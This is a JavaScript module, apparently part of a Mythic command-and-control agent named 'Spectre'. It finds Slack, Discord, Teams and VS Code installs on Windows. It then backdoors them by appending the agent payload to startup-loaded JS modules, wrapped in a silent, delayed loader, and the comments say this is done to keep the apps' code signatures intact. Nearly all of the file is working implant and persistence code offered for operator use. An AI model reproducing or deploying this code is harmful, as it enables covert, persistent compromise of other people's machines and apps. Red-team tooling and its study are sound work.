// ============================================================
// Spectre - Electron App Injection
//
// Discovers installed Electron apps, identifies a suitable
// startup-loaded JS module, and appends the Spectre agent
// payload for persistence. The host app's code signature
// remains intact because only JS source files are modified.
//
// Targets: Slack, Discord, Teams, VSCode, or custom paths.
// ============================================================

const ElectronInjectHandler = {

    // Known Electron app layouts on Windows
    _appPaths: {
        slack: {
            base: ['AppData', 'Local', 'slack'],
            resources: 'resources',
            // Slack uses app.asar.unpacked for native modules
            targets: [
                'app.asar.unpacked/node_modules/@puja/websocket/index.js',
                'app.asar.unpacked/node_modules/keytar/lib/keytar.js',
            ],
        },
        discord: {
            base: ['AppData', 'Local', 'Discord'],
            resources: 'resources',
            targets: [
                'app.asar.unpacked/node_modules/discord_utils/index.js',
                'app.asar.unpacked/node_modules/erlpack/index.js',
            ],
        },
        teams: {
            base: ['AppData', 'Local', 'Microsoft', 'Teams'],
            resources: 'resources',
            targets: [
                'app.asar.unpacked/node_modules/slimcore/index.js',
                'app.asar.unpacked/node_modules/@aspect/core/index.js',
            ],
        },
        vscode: {
            base: ['AppData', 'Local', 'Programs', 'Microsoft VS Code'],
            resources: 'resources',
            // VSCode doesn't use app.asar.unpacked the same way
            // but has accessible node_modules in resources/app
            targets: [
                'app/node_modules/graceful-fs/graceful-fs.js',
                'app/node_modules/yauzl/index.js',
            ],
        },
    },

    /**
     * Discover installed Electron applications on the target.
     * Returns info about each app: path, whether it has injectable modules.
     */
    discover: function() {
        const fs = require('fs');
        const path = require('path');
        const os = require('os');

        const userHome = os.homedir();
        const results = [];

        for (const appName in this._appPaths) {
            const appConfig = this._appPaths[appName];
            const basePath = path.join(userHome, ...appConfig.base);

            // Check if base directory exists
            if (!fs.existsSync(basePath)) continue;

            // Electron apps often have versioned directories (app-1.2.3/)
            // Find the most recent version
            let resourcesPath = null;

            // Check direct resources path first
            const directPath = path.join(basePath, appConfig.resources);
            if (fs.existsSync(directPath)) {
                resourcesPath = directPath;
            } else {
                // Look for versioned app directories
                try {
                    const entries = fs.readdirSync(basePath);
                    const appDirs = entries
                        .filter(function(e) { return e.startsWith('app-'); })
                        .sort()
                        .reverse();

                    for (let i = 0; i < appDirs.length; i++) {
                        const versionedPath = path.join(basePath, appDirs[i], appConfig.resources);
                        if (fs.existsSync(versionedPath)) {
                            resourcesPath = versionedPath;
                            break;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!resourcesPath) continue;

            // Check for injectable target modules
            const injectableTargets = [];
            for (let i = 0; i < appConfig.targets.length; i++) {
                const targetPath = path.join(resourcesPath, appConfig.targets[i]);
                if (fs.existsSync(targetPath)) {
                    injectableTargets.push({
                        path: targetPath,
                        relativePath: appConfig.targets[i],
                        size: fs.statSync(targetPath).size,
                    });
                }
            }

            results.push({
                name: appName,
                basePath: basePath,
                resourcesPath: resourcesPath,
                hasInjectableTargets: injectableTargets.length > 0,
                targets: injectableTargets,
            });
        }

        return {
            user_output: ElectronInjectHandler._formatDiscovery(results),
            completed: true,
            status: 'success',
            discovery: results,
        };
    },

    /**
     * Inject the Spectre agent into an Electron app's JS module.
     *
     * Strategy:
     *   1. Read the target module's existing source
     *   2. Append the agent payload wrapped in a try/catch + setTimeout
     *   3. Write back - the app loads the backdoored module on next start
     *
     * The Electron binary's code signature is NOT affected because
     * we only modify JavaScript source files in the unpacked directory.
     */
    inject: function(params) {
        const fs = require('fs');
        const path = require('path');

        try {
            let targetPath;

            if (params.custom_path) {
                // Custom target path provided by operator
                targetPath = params.custom_path;
            } else if (params.app_name && params.app_name !== 'custom') {
                // Auto-discover the target
                const discovery = this.discover();
                const app = discovery.discovery.find(function(a) {
                    return a.name === params.app_name;
                });

                if (!app || !app.hasInjectableTargets) {
                    return {
                        user_output: 'App "' + params.app_name + '" not found or has no injectable targets.\n' +
                                     'Run inject with --app_name custom --custom_path to specify a path.',
                        completed: true,
                        status: 'error',
                    };
                }

                // Use the first available target
                targetPath = params.target_module
                    ? path.join(app.resourcesPath, params.target_module)
                    : app.targets[0].path;
            } else {
                return {
                    user_output: 'Specify --app_name or --custom_path',
                    completed: true,
                    status: 'error',
                };
            }

            if (!fs.existsSync(targetPath)) {
                return {
                    user_output: 'Target module not found: ' + targetPath,
                    completed: true,
                    status: 'error',
                };
            }

            // Read the existing module source
            const originalSource = fs.readFileSync(targetPath, 'utf-8');

            // Check if already injected (idempotency)
            if (originalSource.indexOf('__spectre_init') !== -1) {
                return {
                    user_output: 'Target already contains Spectre payload. Skipping.',
                    completed: true,
                    status: 'success',
                };
            }

            // Build the injection payload
            // The agent source is embedded during Mythic build - here we
            // use a self-referencing approach: read our own running source
            // and re-inject it. In practice, the built payload is a single
            // IIFE string that the builder stamps in.
            const agentPayload = params.payload_source || ElectronInjectHandler._getSelfSource();

            // Wrap in a delayed, silent-failure loader
            const injectionBlock = [
                '',
                '// __spectre_init',
                '(function() {',
                '  var _t = setTimeout(function() {',
                '    try {',
                '      ' + agentPayload.split('\n').join('\n      '),
                '    } catch(_e) {}',
                '  }, ' + (params.delay || 5000) + ');',
                '  if (_t && _t.unref) _t.unref();',
                '})();',
            ].join('\n');

            // Backup original (operator can restore later)
            const backupPath = targetPath + '.spectre.bak';
            if (!fs.existsSync(backupPath)) {
                fs.writeFileSync(backupPath, originalSource);
            }

            // Append payload to module source
            const modifiedSource = originalSource + injectionBlock;
            fs.writeFileSync(targetPath, modifiedSource);

            return {
                user_output: [
                    'Injection successful!',
                    '  Target:  ' + targetPath,
                    '  Backup:  ' + backupPath,
                    '  Delay:   ' + (params.delay || 5000) + 'ms after app start',
                    '  Size:    ' + originalSource.length + ' -> ' + modifiedSource.length + ' bytes',
                    '',
                    'The agent will activate next time the host application starts.',
                    'Use "uninstall" to restore the original module from backup.',
                ].join('\n'),
                completed: true,
                status: 'success',
            };

        } catch (err) {
            return {
                user_output: 'Injection failed: ' + err.message,
                completed: true,
                status: 'error',
            };
        }
    },

    /**
     * Remove the injection and restore the original module.
     */
    uninstall: function(params) {
        const fs = require('fs');

        try {
            const targetPath = params.path || params.custom_path;
            const backupPath = targetPath + '.spectre.bak';

            if (!fs.existsSync(backupPath)) {
                return {
                    user_output: 'No backup found at: ' + backupPath,
                    completed: true,
                    status: 'error',
                };
            }

            // Restore original
            const original = fs.readFileSync(backupPath);
            fs.writeFileSync(targetPath, original);
            fs.unlinkSync(backupPath);

            return {
                user_output: 'Restored original module: ' + targetPath,
                completed: true,
                status: 'success',
            };
        } catch (err) {
            return {
                user_output: 'Uninstall failed: ' + err.message,
                completed: true,
                status: 'error',
            };
        }
    },

    /**
     * Get this agent's own source code for re-injection.
     * Falls back to a minimal beacon if self-read fails.
     */
    _getSelfSource: function() {
        // In the assembled payload, the entire agent is within a single IIFE
        // The builder stamps the source here during build
        return '/* agent source injected at build time */';
    },

    /**
     * Format discovery results for operator display.
     */
    _formatDiscovery: function(results) {
        if (results.length === 0) {
            return 'No Electron applications found on this system.';
        }

        let output = 'Discovered Electron Applications:\n';
        output += '=================================\n\n';

        for (let i = 0; i < results.length; i++) {
            const app = results[i];
            output += '  ' + app.name.toUpperCase() + '\n';
            output += '    Base: ' + app.basePath + '\n';
            output += '    Resources: ' + app.resourcesPath + '\n';

            if (app.targets.length > 0) {
                output += '    Injectable targets:\n';
                for (let j = 0; j < app.targets.length; j++) {
                    const t = app.targets[j];
                    output += '      [' + j + '] ' + t.relativePath + ' (' + t.size + ' bytes)\n';
                }
            } else {
                output += '    No injectable targets found (try custom path)\n';
            }
            output += '\n';
        }

        return output;
    }
};
